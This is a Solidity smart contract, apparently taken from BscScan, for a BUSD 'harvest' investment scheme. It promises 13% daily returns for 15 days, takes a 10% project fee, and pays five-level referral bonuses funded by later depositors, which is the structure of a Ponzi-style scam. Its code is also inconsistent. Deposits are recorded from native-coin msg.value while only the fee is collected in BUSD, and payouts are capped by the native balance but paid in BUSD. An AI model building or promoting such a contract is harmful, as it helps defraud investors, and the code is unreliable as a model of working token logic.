/**
 *Submitted for verification at BscScan.com on 2021-12-14
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
   
    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

  
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        
    
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract CryptoHarvestBUSD {
	using SafeMath for uint256;
    using SafeERC20 for IERC20;

	uint256 constant public SOW_MIN_AMOUNT = 50; //500e16
	uint256[] public REFERRAL_PERCENTS = [40, 20, 10, 7, 3];
	uint256 constant public TOTAL_REF = 80;
	uint256 constant public PROJECT_FEE = 100;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
    
	uint256 public totalSowed;
    
    IERC20 public BUSD;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Sow {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct Action {
        uint8   types;
		uint256 amount;
		uint256 date;
	}

	struct User {
		Sow[] sows;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 harvested;
		Action[] actions;
	}

	mapping (address => User) internal users;

	bool public started;
	address payable public commissionWallet;

	event Newbie(address user);
	event NewSow(address indexed user, uint8 plan, uint256 amount);
	event Harvested(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable wallet) {
		require(!isContract(wallet));
        BUSD = IERC20(0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee); //0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
		commissionWallet = wallet;

        plans.push(Plan(15, 130));
      
	}

    
	function sow(address referrer) public payable {
		uint8 plan = 0;
		if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}

		require(msg.value >= SOW_MIN_AMOUNT, "Minimum deposit amount is 50BUSD");

        require(plan < 1, "Invalid plan");

		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        BUSD.safeTransferFrom(msg.sender, address(this), fee);

	
		emit FeePayed(msg.sender, fee);

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].sows.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}
		else{

			address upline = commissionWallet;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}

		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}else{

			address upline = commissionWallet;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}

		if (user.sows.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.sows.push(Sow(plan, msg.value, block.timestamp));
		user.actions.push(Action(0, msg.value, block.timestamp));

		totalSowed = totalSowed.add(msg.value);

        BUSD.safeTransfer(commissionWallet, msg.value / 10);
		emit NewSow(msg.sender, plan, msg.value);
	}


	function harvest() public {
		User storage user = users[msg.sender];
        uint256 totalAmount = getUserDividends(msg.sender);
    
			uint256 referralBonus = getUserReferralBonus(msg.sender);
			if (referralBonus > 0) {
				user.bonus = 0;
				totalAmount = totalAmount.add(referralBonus);
			}

			require(totalAmount > 0, "User has no dividends");

			uint256 contractBalance = address(this).balance;
			if (contractBalance < totalAmount) {
				user.bonus = totalAmount.sub(contractBalance);
				user.totalBonus = user.totalBonus.add(user.bonus);
				totalAmount = contractBalance;
			}


		user.checkpoint = block.timestamp;
		user.harvested = user.harvested.add(totalAmount);

        BUSD.safeTransfer(msg.sender, totalAmount);
		user.actions.push(Action(1, totalAmount, block.timestamp));

        
		emit Harvested(msg.sender, totalAmount);
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo() public view returns(uint256 time, uint256 percent) {
		time = plans[0].time;
		percent = plans[0].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.sows.length; i++) {
			uint256 finish = user.sows[i].start.add(plans[user.sows[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.sows[i].amount.mul(plans[user.sows[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.sows[i].start > user.checkpoint ? user.sows[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUsertotalHarvested(address userAddress) public view returns (uint256) {
		return users[userAddress].harvested;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralHarvested(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfSows(address userAddress) public view returns(uint256) {
		return users[userAddress].sows.length;
	}

	function getUserTotalSows(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].sows.length; i++) {
			amount = amount.add(users[userAddress].sows[i].amount);
		}
	}

	function getUserSowsInfo(address userAddress) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    uint256 index = 0;
	    User storage user = users[userAddress];

		plan = user.sows[index].plan;
		percent = plans[plan].percent;
		amount = user.sows[index].amount;
		start = user.sows[index].start;
		finish = user.sows[index].start.add(plans[user.sows[index].plan].time.mul(TIME_STEP));
	}

	function getUserActions(address userAddress, uint256 index) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {
		require(index > 0,"wrong index");
        User storage user = users[userAddress];
		uint256 start;
		uint256 end;
		uint256 cnt = 50;


		start = (index - 1) * cnt;
		if(user.actions.length < (index * cnt)){
			end = user.actions.length;
		}
		else{
			end = index * cnt;
		}

		
        uint8[]   memory types = new  uint8[](end - start);
        uint256[] memory amount = new  uint256[](end - start);
        uint256[] memory date = new  uint256[](end - start);

        for (uint256 i = start; i < end; i++) {
            types[i-start] = user.actions[i].types;
            amount[i-start] = user.actions[i].amount;
            date[i-start] = user.actions[i].date;
        }
        return
        (
        types,
        amount,
        date
        );
    }
    
    
	function getUserActionLength(address userAddress) public view returns(uint256) {
		return users[userAddress].actions.length;
	}

	function getSiteInfo() public view returns(uint256 _totalSowed, uint256 _totalBonus) {
		return(totalSowed, totalSowed.mul(TOTAL_REF).div(PERCENTS_DIVIDER));
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalHarvested, uint256 totalReferrals) {
		return(getUserTotalSows(userAddress), getUsertotalHarvested(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    
}